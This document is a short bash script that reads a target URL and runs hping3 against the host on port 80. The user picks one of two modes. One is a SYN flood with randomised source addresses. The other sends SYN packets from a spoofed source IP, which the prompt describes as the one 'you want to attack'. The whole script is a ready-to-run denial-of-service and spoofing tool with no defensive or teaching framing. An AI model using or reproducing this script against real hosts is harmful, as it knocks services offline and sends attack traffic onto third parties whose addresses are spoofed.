
#!/bin/bash

# Function to perform original hping3 command
perform_original_hping3() {
    echo "Performing original hping3 command:"
    hping3 "$website" -q -n -d 120 -S -p 80 --flood --rand-source
}

# Function to perform new hping3 command with a fake IP
perform_fake_ip_hping3() {
    echo "Enter your fake IP That you Want to attack :"
    read fakeip
    sudo hping3 -a "$fakeip" "$website" -S -q -p 80
}

# Read the user's input
echo "Enter the full URL (including protocol, e.g., http://example.com):"
read url

# Validate the input to ensure it starts with either http:// or https://
if [[ ! "$url" =~ ^https?:// ]]; then
    echo "Invalid URL. Please provide a full URL including the protocol (http:// or https://)."
    exit 1
fi

# Extract the host from the URL
website=$(echo "$url" | awk -F[/:] '{print $4}')

# Provide the user with a choice
echo "Choose an option:"
echo "1. Perform original hping3 command"
echo "2. Perform new hping3 command with a fake IP"
read choice

# Perform the selected action based on user choice
case $choice in
    1) perform_original_hping3 ;;
    2) perform_fake_ip_hping3 ;;
    *) echo "Invalid choice. Exiting." ;;
esac
